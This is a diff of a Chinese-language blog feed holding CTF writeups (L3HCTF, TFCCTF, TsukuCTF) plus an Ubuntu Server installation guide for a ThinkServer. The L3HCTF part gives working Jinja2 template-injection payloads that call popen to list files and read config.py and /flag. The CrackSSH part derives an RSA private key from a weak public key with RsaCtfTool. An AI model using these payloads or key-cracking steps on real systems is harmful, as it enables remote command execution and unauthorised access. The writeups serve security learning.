-<p><strong>flag:</strong><code>TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;) </code></p>
+<p>人肉计数&#x2F;写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">num = 0
+for i in a.split(&#39;, &#39;):
+    if &#39;os._wrap_close&#39; in i:
+        print(num)
+    num += 1
+</code></pre>
+<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/3.png" alt="image-20211114183703433"></p>
+<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
+<pre><code class="python">&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
+</code></pre>
+<p><img data-src="/../../CTF/L3HCTF2021-%E4%B8%AA%E4%BA%BA%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/Web/images/5.png" alt="image-20211114184236370"></p>
+<p><strong>flag:</strong><code>l3hsec&#123;emmMmMM_mm~mMMmm~~T&#125;</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>TFCCTF</tag>
+        <tag>L3HCTF</tag>
+        <tag>个人能力认证</tag>
       </tags>
   </entry>
   <entry>
@@ -2773,6 +2682,97 @@ What was the ./key found in the previous challenge?
       <tags>
         <tag>CTF</tag>
         <tag>SunshineCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TFCCTF2021 Writeup</title>
+    <url>/posts/501486646/</url>
+    <content><![CDATA[<h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
+<p><em>Wrap the result in TFCCTF{}</em></p>
+<hr>
+<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo">gchq.github.io</a>上解密</p>
+<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
+<p><strong>flag:</strong><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code></p>
+<h1 id="SEA-LANGUAGE-2"><a href="#SEA-LANGUAGE-2" class="headerlink" title="SEA LANGUAGE? 2"></a>SEA LANGUAGE? 2</h1><p><em>That&#39;s just another way to......</em></p>
+<hr>
+<p>题目给的数据8个字符为一组,猜测可能是二进制,在<a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'_'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo">gchq.github.io</a>将<code>.</code>替换为<code>0</code>,<code>_</code>替换为<code>1</code>,然后二进制转字符串</p>
+<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png" alt="image-20211202205739848"></p>
+<p><strong>flag:</strong><code>TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125;</code></p>
+<h1 id="AAAAA"><a href="#AAAAA" class="headerlink" title="AAAAA"></a>AAAAA</h1><p><em>AAAAA. That&#39;s all</em></p>
+<hr>
+<p>首先用<code>exiftool</code>分析,提示文件前2000个字节都是A</p>
+<pre><code class="shell">~$ exiftool AAAAA
+ExifTool Version Number         : 12.31
+File Name                       : AAAAA
+Directory                       : .
+File Size                       : 157 KiB
+File Modification Date/Time     : 2021:11:27 00:33:54+08:00
+File Access Date/Time           : 2021:11:27 00:35:25+08:00
+File Inode Change Date/Time     : 2021:11:27 00:34:19+08:00
+File Permissions                : -rw-r--r--
+Error                           : First 2000 bytes of file is ASCII &#39;A&#39; characters
+</code></pre>
+<p><code>hexdump -C AAAAA   </code>发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片</p>
+<pre><code class="shell">~$ hexdump -C AAAAA | head
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
+000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|
+000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|
+00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|
+00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g&#123;.......9.P..|
+00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|
+00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|
+00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|
+
+~$ hexdump -C AAAAA | tail  
+00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|
+00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|
+00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|
+00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|
+00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|
+00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|
+00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
+00027519
+</code></pre>
+<p>去除文件首位的<code>A</code>即可,代码:</p>
+<pre><code class="python">from pathlib import  Path
+p = Path(&#39;AAAAA&#39;)
+data = p.read_bytes()
+data = data.strip(b&#39;A&#39;)
+Path(&#39;a.png&#39;).write_bytes(data)
+</code></pre>
+<p><img data-src="/../../CTF/TFCCTF2021/Forensics/images/AAAAA.png" alt="AAAAA.png"></p>
+<p><strong>flag:</strong><code>TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125;</code></p>
+<h1 id="DISCORD-SHENANIGANS"><a href="#DISCORD-SHENANIGANS" class="headerlink" title="DISCORD SHENANIGANS"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That&#39;s the beginning of a good CTF! Discord is the new Twitter.</em></p>
+<p><em>To be able to solve this challenge, you&#39;ll need to join our discord. Link in the Rules page.</em></p>
+<hr>
+<p>翻阅比赛官方的Discord,发现<code>#general</code>频道有一条特别奇怪的消息</p>
+<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png" alt="image-20211203203451799"></p>
+<p>使用<a href="https://holloway.nz/steg/">Twitter Secret Messages</a>解密即可</p>
+<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png" alt="image-20211202215347694"></p>
+<p><strong>flag:</strong><code>TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125;</code></p>
+<h1 id="PRETTY-GOOD-PHISHER"><a href="#PRETTY-GOOD-PHISHER" class="headerlink" title="PRETTY GOOD PHISHER"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he&#39;s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>
+<p><em>A2DCB36111E3656B</em></p>
+<hr>
+<p>题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥</p>
+<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&EmailOrName=3&SearchType=0">https://keyserver.pgp.com/</a>上检索,得到邮箱<code>tdgd11fd8@gmail.com</code></p>
+<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
+<p>在<a href="https://tools.epieos.com/email.php">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>
+<img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;" />
+
+<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>
+<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
+<p><strong>flag:</strong><code>TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;) </code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>TFCCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -3062,6 +3062,216 @@ im.save(&#39;ans.png&#39;)
       </tags>
   </entry>
   <entry>
+    <title>ThinkServer RD650安装Ubuntu Server 16.04</title>
+    <url>/posts/560540611/</url>
+    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+<li>在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(<a href="http://releases.ubuntu.com/16.04/">下载链接</a>)；</li>
+<li>使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘；</li>
+<li>将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为<code>Ubuntu.iso</code>；<span id="more"></span></li>
+</ol>
+<h2 id="设置引导"><a href="#设置引导" class="headerlink" title="设置引导"></a>设置引导</h2><ol>
+<li>按电源键开机，启动服务器(服务器启动可能会比较缓慢)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg)</li>
+<li>出现此界面时，按&quot;F10&quot;进入TDM(ThinkServer Deployment Manager)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg)</li>
+<li>进入TDM后，选择&quot;BIOS Setup(BIOS 设置)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg)</li>
+<li>选择&quot;Boot Manager(引导管理)&quot;,将&quot;Boot Mode(引导模式)&quot;改为&quot;UEFI Only(仅UEFI模式)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg)</li>
+<li>点击&quot;Save &amp; Reset(保存 &amp; 重启)&quot;,在弹出的对话框中选择&quot;Yes(是)&quot;重启电脑。如果出现如下对话框，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg)</li>
+</ol>
+<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ol>
+<li>将U盘插入服务器后的USB插槽中，重启服务器，进入下图所示界面。选择&quot;Install Ubuntu Server(安装Ubuntu服务器版)&quot;；<br>注:若无法进入下图所示界面，请进入BIOS修改U盘为第一启动项。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg)</li>
+<li>选择安装过程和系统的默认语言为&quot;English(英语)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg)</li>
+<li>&quot;Select your location(选择你的区域)&quot;，这里选择&quot;Other(其他)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg)</li>
+<li>&quot;Continent or region(大陆或地区)&quot;选择&quot;Asia(亚洲)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg)</li>
+<li>&quot;Country(国家)&quot;选择&quot;China(中国)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg)</li>
+<li>是否通过一系列的按键检测键盘布局，选择&quot;NO(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg)</li>
+<li>字符集编码选择&quot;United States -en_US.UTF-8&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg)</li>
+<li>&quot;Country or Region for the keyboard(键盘布局所属国家或地区)&quot;,选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg)</li>
+<li>&quot;Keyboard layout(键盘布局)&quot;，选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg)</li>
+<li>稍等片刻，将会显示出现错误,原因为:安装程序未检测到CD-ROM。是否重试，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg)</li>
+<li>进入如下界面，选择&quot;Execute a shell(运行shell)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg)</li>
+<li>在shell中依次输入如下命令:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /dev/sd*</span><br><span class="line">umount /dev/sdb4/</span><br><span class="line">mkdir udev</span><br><span class="line">mount /dev/sdb4 /udev</span><br><span class="line">mount /udev/ubuntu.iso /cdrom</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+一般会出现两个<code>/dev/sdb*</code>项，我们选择带数字的那一项去替换上面代码中的<code>/dev/sdb4</code>;<br><code>ubuntu.iso</code>为U盘中Ubuntu Server的ISO镜像的文件名&quot;。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg)</li>
+<li>进入如下界面后，选择&quot;Detect and mount CD-ROM(探测并挂载光盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg)</li>
+<li>进入如下界面，选择&quot;Network interface(网络接口)&quot;，这里选择第一个网络接口，等待安装程序自动完成配置；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg)</li>
+<li>设置&quot;Hostname(主机名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg)</li>
+<li>设置&quot;Full name for the new user(新用户的全名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg)</li>
+<li>设置&quot;Username for your account(你账号的用户名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg)</li>
+<li>设置&quot;password for the new user(新用户的密码)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg)</li>
+<li>如果所设置的密码较为简单，可能会弹出如下对话框，询问你是否使用一个&quot;weak password(弱口令)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg)</li>
+<li>出现如下界面，询问你是否&quot;Encrypt your home directory(加密你的主目录)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg)</li>
+<li>然后可能会出现时区设置错误，选择 &quot;Continue(继续)&quot;,进入如下界面，选择&quot;Install the system(安装系统)&quot;,然后直接回车，选择&quot;Partion disks(磁盘分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg)</li>
+<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg)</li>
+<li>选择&quot;Partitioning method(分区方法)&quot;，这里我们选择&quot;Guided - use entire disk and set up LVM(使用整个磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg)</li>
+<li>&quot;Select disk to partition(选择要分区的磁盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg)</li>
+<li>选择&quot;Partitioning Scheme(分区方案) &quot;，这里推荐选择&quot;All files in one partition(所有文件放在同一分区)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg)</li>
+<li>出现如下界面，询问你是否&quot;Write the changes to disks and configure LVM(将修改写入磁盘并配置LVM)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg)</li>
+<li>设置&quot;Name of the volume group for the new system(新系统的卷组名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg)</li>
+<li>设置&quot;Amount of volume group to use for guided partitioning(用于分区引导的卷组数)&quot;，默认大小即可，无需修改；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg)</li>
+<li>出现下图界面，询问你是否&quot;Umount partitions that are in use(卸载正在使用的分区)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg)</li>
+<li>出现如下界面，询问你是否&quot;Force UEFI installation(强制UEFI安装)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg)</li>
+<li>出现如下界面，询问是否&quot;Write the changes to disks(将改动写入磁盘)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg)</li>
+<li>&quot;Kernel to install(要安装的内核)&quot;,选择默认的&quot;Linux-generic&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg)</li>
+<li>回车后出现如下界面，这里要选择包含在initrd中的驱动程序，选择默认的&quot;generic:include all available drivers(通用:包含所有可用的驱动程序)&quot;即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg)</li>
+<li>&quot;HTTP proxy information(HTTP代理信息)&quot;不写，直接回车即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg)</li>
+<li>询问你管理系统更新的方式，选择&quot;No automatic updates(不自动更新)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg)</li>
+<li>&quot;Choose software to install(选择要安装的软件)&quot;，建议勾选上&quot;OpenSSh server&quot;，然后回车;<br>选择方法为:通过键盘上下键移动光标至选要择项，在要选择的项上按空格即可；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg)</li>
+<li>回车后，显示安装完成，继续回车，重启系统，此时就可以拔掉U盘；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg)</li>
+<li>重启后，再次进入TDM，将&quot;Boot Mode(引导模式)&quot;改为&quot;Legacy　Only(仅Legacy模式)&quot;，否则有可能出现不能进入Linux系统的情况；</li>
+</ol>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TsukuCTF2021 Writeup</title>
+    <url>/posts/434189373/</url>
+    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが...。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
+<hr>
+<p>题目中给了一个公钥:</p>
+<pre><code class="asciiarmor">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp
+</code></pre>
+<p>参考知乎(<a href="https://zhuanlan.zhihu.com/p/33949377">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>
+<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>
+<pre><code class="assembly">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|
+00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|
+00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|
+00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|
+00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|
+00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\.(.eR|
+00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\..$).s..&gt;.|
+00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|
+00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|
+00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|
+000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|
+000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|
+000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|
+000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|
+000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|
+000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|
+00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|
+00000110  a2 59 03 3c 19                                    |.Y.&lt;.|
+00000115
+</code></pre>
+<ul>
+<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>
+</li>
+<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>
+</li>
+<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>
+<pre><code class="shell">~$ echo &quot;$((16#00000081))&quot;
+129
+~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)
+~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e
+0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c
+~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n
+bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021
+</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>
+<pre><code class="shell">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse
+    0:d=0  hl=4 l= 264 cons: SEQUENCE          
+    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19
+  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF
+</code></pre>
+</blockquote>
+<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>
+<pre><code class="shell">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private
+</code></pre>
+<pre><code class="asciiarmor">-----BEGIN RSA PRIVATE KEY-----
